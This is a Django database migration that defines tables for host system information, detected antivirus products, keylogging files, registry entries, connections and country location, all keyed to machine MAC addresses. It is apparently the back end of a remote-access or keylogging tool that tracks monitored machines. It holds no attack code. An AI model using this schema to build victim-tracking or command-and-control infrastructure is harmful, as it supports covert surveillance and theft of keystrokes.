# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
    ]

    operations = [
        migrations.CreateModel(
            name='Antivirus',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('antivirus_detected', models.CharField(max_length=40)),
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='Connection',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('ip_address', models.CharField(max_length=20)),
                ('connection_type', models.CharField(default=b'NA', max_length=60)),
                ('timestamp', models.DateTimeField(auto_now_add=True)),
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='Keylogging',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('filename', models.CharField(max_length=20)),
                ('timestamp', models.DateTimeField(auto_now_add=True)),
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='Location',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('country', models.CharField(max_length=5)),
                ('ip_address', models.ForeignKey(to='database.Connection')),
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='Registry',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('registry', models.CharField(max_length=40)),
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='System_Information',
            fields=[
                ('mac_address', models.CharField(max_length=20, unique=True, serialize=False, primary_key=True)),
                ('op_system', models.CharField(default=b'None', max_length=20)),
                ('cpu', models.CharField(default=b'None', max_length=20)),
                ('connection_allowed', models.BooleanField(default=True)),
                ('created', models.DateTimeField(auto_now_add=True, null=True)),
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='User',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('username', models.CharField(max_length=40)),
                ('mac_address', models.ForeignKey(to='database.System_Information')),
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.AddField(
            model_name='registry',
            name='mac_address',
            field=models.ForeignKey(to='database.System_Information'),
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='keylogging',
            name='mac_address',
            field=models.ForeignKey(to='database.System_Information'),
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='connection',
            name='mac_address',
            field=models.ForeignKey(to='database.System_Information'),
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='antivirus',
            name='mac_address',
            field=models.ForeignKey(to='database.System_Information'),
            preserve_default=True,
        ),
    ]
